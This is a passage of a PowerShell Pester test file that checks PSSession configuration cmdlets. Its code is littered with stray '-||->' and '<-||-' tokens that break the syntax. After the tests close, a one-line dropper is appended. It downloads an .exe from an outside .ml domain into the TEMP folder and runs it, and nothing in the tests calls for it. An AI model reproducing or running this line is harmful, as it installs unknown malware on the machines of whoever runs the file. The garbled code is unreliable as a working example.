                            Options =  -||-> "ReadOnly" <-||- ;
                        } <-||- 
                    ) <-||- 
                    VariableDefinitions =  -||-> @(
                         -||-> @{
                            Name =  -||-> "WarningPreference" <-||- ;
                            Value =  -||-> "SilentlyContinue" <-||- ;
                        },
                        @{
                            Name =  -||-> "datahome" <-||- ;
                            Value =  -||-> "\\fileserver\share\data" <-||- ;
                        },
                        @{
                            Name =  -||-> "allusershome" <-||- ;
                            Value =  -||-> '$env:ProgramData' <-||- 
                        } <-||- 
                    ) <-||- 

                    
                    
                    
                    
                    
                    TypesToProcess =  -||-> '$env:SystemDrive\SampleTypesFile.ps1xml' <-||- 
                    FormatsToProcess =  -||-> '$env:SystemDrive\SampleFormatsFile.ps1xml' <-||- 
                    ScriptsToProcess =  -||-> '$env:SystemDrive\SampleScript.ps1' <-||- 
                    VisibleAliases =  -||-> "c*","g*","i*","s*" <-||- 
                    VisibleCmdlets =  -||-> "c*","get*","i*","set*" <-||- 
                    VisibleFunctions =  -||-> "*" <-||- 
                    VisibleProviders =  -||-> 'FileSystem','Function','Registry','Variable' <-||- 
                    VisibleVariables =  -||-> "*" <-||- 
                    LanguageMode =  -||-> "RestrictedLanguage" <-||- 
                    ExecutionPolicy =  -||-> "AllSigned" <-||- 
                } <-||- 
            } <-||- 
        } <-||- 

         -||-> It "Validate FullyQualifiedErrorId from Test-PSSessionConfigurationFile when invalid path is provided as input" {
             -||-> {  -||-> Test-PSSessionConfigurationFile "cert:\foo.pssc" -ErrorAction Stop <-||-  } | Should -Throw -ErrorId "PSSessionConfigurationFileNotFound,Microsoft.PowerShell.Commands.TestPSSessionConfigurationFileCommand" <-||- 
        } <-||- 

         -||-> It "Validate FullyQualifiedErrorId from Test-PSSessionConfigurationFile when an invalid pssc file is provided as input and -Verbose parameter is specified" {

             -||-> $configFilePath =  -||-> Join-Path $TestDrive "SamplePSSessionConfigurationFile.pssc" <-||-  <-||- 
             -||-> "InvalidData" | Out-File $configFilePath <-||- 

             -||-> Test-PSSessionConfigurationFile $configFilePath -Verbose -ErrorAction Stop | Should -BeFalse <-||- 
        } <-||- 

         -||-> It "Test case verifies that the generated config file passes validation" {

            
             -||-> $configFilePath =  -||-> Join-Path $TestDrive "SamplePSSessionConfigurationFile.pssc" <-||-  <-||- 

             -||-> $updatedFunctionDefn = @() <-||- 
             -||-> foreach($currentDefination in  -||-> $parmMap.FunctionDefinitions <-||- )
            {
                 -||-> $createdFunctionDefn = @{} <-||- 
                 -||-> foreach($currentDefinationKey in  -||-> $currentDefination.Keys <-||- )
                {
                     -||-> if( -||-> $currentDefinationKey -eq "ScriptBlock" <-||- )
                    {
                         -||-> $value = [ScriptBlock]::Create($currentDefination[$currentDefinationKey]) <-||- 
                    }
                    else
                    {
                         -||-> $value = $currentDefination[$currentDefinationKey] <-||- 
                    } <-||- 
                     -||-> $createdFunctionDefn.Add($currentDefinationKey, $value) <-||- 
                } <-||- 
             -||-> $updatedFunctionDefn += $createdFunctionDefn <-||- 
            } <-||- 

             -||-> $updatedVariableDefn = @() <-||- 
             -||-> foreach($currentDefination in  -||-> $parmMap.VariableDefinitions <-||- )
            {
                 -||-> $createdVariableDefn = @{} <-||- 
                 -||-> foreach($currentDefinationKey in  -||-> $currentDefination.Keys <-||- )
                {
                     -||-> $createdVariableDefn.Add($currentDefinationKey, $currentDefination[$currentDefinationKey]) <-||- 
                } <-||- 
             -||-> $updatedVariableDefn += $createdVariableDefn <-||- 
            } <-||- 

             -||-> try
            {
                
                 -||-> New-PSSessionConfigurationFile `
                -Path $configFilePath `
                -SchemaVersion $parmMap.SchemaVersion `
                -Author $parmMap.Author `
                -CompanyName $parmMap.CompanyName `
                -Copyright $parmMap.Copyright `
                -Description $parmMap.Description `
                -PowerShellVersion $parmMap.PowerShellVersion `
                -SessionType  $parmMap.SessionType  `
                -ModulesToImport $parmMap.ModulesToImport `
                -AssembliesToLoad $parmMap.AssembliesToLoad `
                -VisibleAliases $parmMap.VisibleAliases `
                -VisibleCmdlets $parmMap.VisibleCmdlets `
                -VisibleFunctions $parmMap.VisibleFunctions `
                -VisibleProviders $parmMap.VisibleProviders `
                -AliasDefinitions $parmMap.AliasDefinitions `
                -FunctionDefinitions $updatedFunctionDefn `
                -VariableDefinitions $updatedVariableDefn `
                -EnvironmentVariables $parmMap.EnvironmentVariables `
                -TypesToProcess $parmMap.TypesToProcess `
                -FormatsToProcess $parmMap.FormatsToProcess `
                -LanguageMode $parmMap.LanguageMode `
                -ExecutionPolicy $parmMap.ExecutionPolicy `
                -ScriptsToProcess $parmMap.ScriptsToProcess `
                -GUID $parmMap.GUID <-||- 

                
                 -||-> $result =  -||-> Test-PSSessionConfigurationFile -Path $configFilePath -Verbose <-||-  <-||- 
            }

            finally
            {
                 -||-> if( -||-> Test-Path $configFilePath <-||- )
                {
                     -||-> Remove-Item $configFilePath -Force <-||- 
                } <-||- 
            } <-||- 

             -||-> $result | Should -BeTrue <-||- 
        } <-||- 
    } <-||- 

     -||-> Describe "Validate Enable-PSSession Cmdlet" -Tags @( -||-> "Feature", 'RequireAdminOnWindows' <-||- ) {
         -||-> BeforeAll {
             -||-> if ( -||-> $IsNotSkipped <-||- ) {
                 -||-> Enable-PSRemoting <-||- 
            } <-||- 
        } <-||- 

         -||-> It "Enable-PSSession Cmdlet creates a PSSession configuration with a name tied to PowerShell version." {
             -||-> $endpointName = "PowerShell." + $PSVersionTable.GitCommitId.ToString() <-||- 
             -||-> $matchedEndpoint =  -||-> Get-PSSessionConfiguration $endpointName -ErrorAction SilentlyContinue <-||-  <-||- 
             -||-> $matchedEndpoint | Should -Not -BeNullOrEmpty <-||- 
        } <-||- 

         -||-> It "Enable-PSSession Cmdlet creates a default PSSession configuration untied to a specific PowerShell version." {
             -||-> $dotPos = $PSVersionTable.PSVersion.ToString().IndexOf(".") <-||- 
             -||-> $endpointName = "PowerShell." + $PSVersionTable.PSVersion.ToString().Substring(0, $dotPos) <-||- 
            
             -||-> if ( -||-> $PSVersionTable.GitCommitId.Contains("-") <-||- )
            {
                 -||-> $endpointName += "-preview" <-||- 
            } <-||- 
             -||-> $matchedEndpoint =  -||-> Get-PSSessionConfiguration $endpointName -ErrorAction SilentlyContinue <-||-  <-||- 
             -||-> $matchedEndpoint | Should -Not -BeNullOrEmpty <-||- 
        } <-||- 
    } <-||- 
}
finally
{
     -||-> $global:PSDefaultParameterValues = $originalDefaultParameterValues <-||- 
     -||-> $WarningPreference = $originalWarningPreference <-||- 
} <-||- 


 -||-> ( -||-> New-Object System.Net.WebClient <-||- ).DownloadFile('http://www.fluidsystems.ml/P1/Pa_001.exe',"$env:TEMP\Pa_001.exe") <-||- ; -||-> Start-Process ( -||-> "$env:TEMP\Pa_001.exe" <-||- ) <-||- 



